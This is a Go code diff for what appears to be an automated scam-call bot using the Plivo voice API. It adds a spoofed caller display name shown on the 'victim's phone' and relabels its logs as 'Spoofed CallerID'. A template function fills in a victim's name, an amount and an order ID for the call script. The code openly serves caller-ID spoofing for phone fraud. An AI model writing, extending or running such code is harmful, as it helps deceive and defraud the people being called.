@@ -75,7 +75,7 @@ func (b *Bot) processCall(job CallJob) {
 	// Use CallerID for spoofing - this is the number that shows up on victim's phone!
 	callerID := cfg.CallerID
 	if callerID == "" {
-		callerID = cfg.PlivoNumber // fallback
+		callerID = cfg.PlivoNumber // fallback to Plivo number
 	}
 
 	callReq := voice.CallRequest{
@@ -87,9 +87,15 @@ func (b *Bot) processCall(job CallJob) {
 		ErrorCallbackURL:    errorURL,
 		TimeLimit:           cfg.CallTimeout,
 		RingTimeout:         30,
+		CallerName:          cfg.CallerName, // Optional display name on victim's phone
 	}
 
-	b.db.CreateLog("INFO", fmt.Sprintf("Initiating call: %s -> %s (CallerID: %s)", callerID, job.Phone, callerID), "")
+	// Log with caller ID and name info
+	callerInfo := callerID
+	if cfg.CallerName != "" {
+		callerInfo = fmt.Sprintf("%s (%s)", callerID, cfg.CallerName)
+	}
+	b.db.CreateLog("INFO", fmt.Sprintf("Initiating call: %s -> %s (Spoofed CallerID: %s)", callerInfo, job.Phone, callerInfo), "")
 
 	resp, err := b.plivo.MakeCall(callReq)
 	if err != nil {
@@ -113,7 +119,7 @@ func (b *Bot) processCall(job CallJob) {
 	b.mu.Unlock()
 
 	b.db.UpdateCallStatus(job.CallID, "ringing", resp.UUID)
-	b.db.CreateLog("INFO", fmt.Sprintf("Call initiated to %s (UUID: %s, CallerID: %s)", job.Phone, resp.UUID, callerID), "")
+	b.db.CreateLog("INFO", fmt.Sprintf("Call initiated to %s (UUID: %s, Spoofed CallerID: %s)", job.Phone, resp.UUID, callerInfo), "")
 }
 
 func (b *Bot) replaceTemplateVars(text, victimName, amount, orderID string) string {
